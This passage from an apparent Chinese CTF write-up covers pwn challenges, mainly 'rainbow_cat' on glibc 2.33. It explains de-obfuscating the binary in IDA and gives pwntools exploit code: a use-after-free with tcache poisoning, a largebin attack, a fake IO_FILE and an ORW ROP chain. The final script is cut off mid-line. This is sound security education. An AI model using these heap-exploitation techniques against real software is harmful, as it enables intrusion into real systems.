class="line">c = ((add_rsp&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)-a-b+<span class="number">0x20000</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(a).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%12$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(c).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%14$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1206</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1204</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += orw</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="rainbow-cat"><a href="#rainbow-cat" class="headerlink" title="rainbow_cat"></a>rainbow_cat</h2><p>版本：glibc-2.33</p>
<h3 id="修复程序"><a href="#修复程序" class="headerlink" title="修复程序"></a>修复程序</h3><p>刚拿到的程序无法直接进行反汇编，原因是其中加入了很多混淆的数据，如下</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-1.jpg" class>

<p>这条jz指令会让程序跳到<code>0xA64 + 2</code>处执行指令，而<code>[0xA64,0xA64 + 2]</code>之间就加入了两个字节的混淆数据，IDA在识别程序的时候会把这两个字节也当作是指令，但是实际上由于jz的跳转，这两个字节实际上是会被跳过的，这样就达到了不影响程序执行逻辑的前提下让IDA的反汇编出现问题。</p>
<p>解决办法也很简单，在知道这中间的两个字节是无用的之后只需要将其patch成nop即可，首先在<code>0xA64</code>处按<code>D</code>将其转成数据</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-2.jpg" class>

<p>然后patch成nop</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-3.jpg" class>

<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-4.jpg" class>

<p>然后按<code>C</code>重新转成代码</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-5.jpg" class>

<p>但是程序在最开始反汇编失败的时候，反编译失败的那部分代码会是红色的，这时我们patch完之后想反汇编的话还需要把红色的那部分代码给选中然后按<code>C</code>，选<code>Analyze</code>分析，然后再单击选中要反汇编的地址按<code>P</code>即可，完成之后就可以正常显示反汇编代码了</p>
<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-6.jpg" class>

<img src="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/rainbow-7.jpg" class>

<p>可能修复完之后还是会有一点小问题，但是能看懂程序主逻辑就行了</p>
<h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>首先是add</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which cat do you want to get? &quot;</span>);</span><br><span class="line">  index = (read_choice)();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( (ptr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) != qword_203168 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The cat don&#x27;t like you!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    heap[index] = ptr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can&#x27;t get this one&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见最多只能有三个堆指针，固定申请大小为0x10，而且最主要的问题在于申请得到的堆指针会跟<code>qword_203168</code>进行比较，<code>qword_203168</code>在程序开始的时候被赋值成了堆基址，也就是说程序会借此判断malloc返回的指针是否在堆上，如果不在则直接exit()</p>
<p>此外delete有UAF，show固定输出十个字节，且最多用两次edit固定写十个字节</p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>show函数的限制其实无所谓，一次泄漏heap，一次泄漏libc。因为拿不到程序基址所以add中申请chunk位置的限制应该是无法绕过的，这也就意味着这题应该是打IO_FILE的思路。</p>
<p>因为UAF以及edit的存在，就相当于有0x10字节的任意地址写（当然因为add的限制所以其实是任意堆地址写），而add、edit、delete都没有次数限制，也就意味着可以写无限字节。</p>
<p>因为堆指针有限而且为了方便，可以让一个堆指针指向tcache-&gt;counts，再让一个堆指针指向0x20大小的tcache-&gt;entry，这样就可以编辑任意堆地址了。如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x50</span>):</span><br><span class="line">	add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">L = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = L &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)	<span class="comment">#double free</span></span><br><span class="line">edit(<span class="number">0</span>,p64((heap_base+<span class="number">0x10</span>)^L))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)	<span class="comment"># 1 point to tcache counts</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64((heap_base+<span class="number">0x90</span>)^L))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>) <span class="comment"># 2 point to tcache entry</span></span><br></pre></td></tr></table></figure>

<p>然后为了要largebin_attack，构造两个largebin chunk以及一个smallbin chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#make 0xa1 0x441 0x461 chunk</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">5</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x290</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>))	<span class="comment">#0x290 =&gt; 0x441</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x6f0</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x461</span>))	<span class="comment">#0x6f0 =&gt; 0x461</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0xb70</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>))	<span class="comment">#0xb70 =&gt; 0xa1</span></span><br></pre></td></tr></table></figure>

<p>然后就是泄漏libc以及largebin_attack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x700</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7fb5c00</span> - <span class="number">0x00007ffff7dd5000</span>)</span><br><span class="line">IO_list = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0xb80</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)	<span class="comment">#0x461 into largebin</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x2a0</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x710</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(IO_list-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>)<span class="comment">#hijack IO_list_all</span></span><br></pre></td></tr></table></figure>

<p>伪造的IO_FILE结构如下，选择用gadget+栈迁移的方式完成的orw，所以这个IO_FILE结构应该早很多libc版本都可以套用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">‘’‘</span><br><span class="line"><span class="number">0x000000000014d09a</span>: mov rbp, qword ptr [rdi + <span class="number">0x48</span>]; </span><br><span class="line">		    mov rax, qword ptr [rbp + <span class="number">0x18</span>]; </span><br><span class="line">		    lea r13, [rbp + <span class="number">0x10</span>]; </span><br><span class="line">		    mov dword ptr [rbp + <span class="number">0x10</span>], <span class="number">0</span>; </span><br><span class="line">		    mov rdi, r13; </span><br><span class="line">		    call qword ptr [rax + <span class="number">0x28</span>]; </span><br><span class="line">’‘’</span><br><span class="line">heap = heap_base</span><br><span class="line">gadget = libc_base + <span class="number">0x000000000014d09a</span></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">close = libc_base + libc.symbols[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x26699</span></span><br><span class="line">syscall = libc_base + <span class="number">0x6105a</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x44c70</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x28a55</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x112a51</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005525c</span></span><br><span class="line">pop3 = libc_base + <span class="number">0xfc103</span></span><br><span class="line"></span><br><span class="line">fp = heap_base + <span class="number">0x290</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x48</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span>) <span class="comment">#rbp</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x40</span> + <span class="number">0x18</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#_wide_data-&gt;write_ptr &gt; _wide_data-&gt;write_base</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp+<span class="number">0x40</span>) <span class="comment">#_wide_data =&gt; A</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode &gt; 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps) <span class="comment">#vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x120</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp+<span class="number">0xc0</span>) <span class="comment"># B</span></span><br><span class="line">fake_IO_FILE += p64(gadget)</span><br><span class="line"><span class="comment"># &lt;= rbp point to</span></span><br><span class="line">fake_IO_FILE += p64(leave_ret) + p64(pop3) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span> - <span class="number">0x28</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ret)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(fp + <span class="number">0x218</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line">fake_IO_FILE += <span class="string">b&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最后exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./rainbowcat&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.33.so&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x50</span>):</span><br><span class="line">	add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">L = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = L &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)	<span class="comment">#double free</span></span><br><span class="line">edit(<span class="number">0</span>,p64((heap_base+<span class="number">0x10</span>)^L))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)	<span class="comment"># 1 point to tcache counts</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64((heap_base+<span class="number">0x90</span>)^L))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>) <span class="comment"># 2 point to tcache entry</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#make 0xa1 0x441 0x461 chunk</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">5</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x290</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>))	<span class="comment">#0x290 =&gt; 0x441</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x6f0</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x461</span>))	<span class="comment">#0x6f0 =&gt; 0x461</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0xb70</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>))	<span class="comment">#0xb70 =&gt; 0xa1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x700</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7fb5c00</span> - <span class="number">0x00007ffff7dd5000</span>)</span><br><span class="line">IO_list = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0xb80</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)	<span class="comment">#0x461 into largebin</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x2a0</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x710</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(IO_list-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>)<span class="comment">#hijack</span></span><br><span class="line"><span class="comment">###########################</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000016a1fa: mov rbp, qword ptr [rdi + 0x48]; </span></span><br><span class="line"><span class="string">		    mov rax, qword ptr [rbp + 0x18]; </span></span><br><span class="line"><span class="string">		    lea r13, [rbp + 0x10]; </span></span><br><span class="line"><span class="string">		    mov dword ptr [rbp + 0x10], 0; </span></span><br><span class="line"><span class="string">		    mov rdi, r13; </span></span><br><span class="line"><span class="string">		    call qword ptr [rax + 0x28]; </span></span><br><span class="line"><span class="string">		    </span></span><br><span class="line"><span class="string">0x00000000001675b0: mov rdx, qword ptr [rdi + 8]; </span></span><br><span class="line"><span class="string">		    mov qword ptr [rsp], rax; </span></span><br><span class="line"><span class="string">		    call qword ptr [rdx + 0x20]; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">heap = heap_base</span><br><span class="line">gadget = 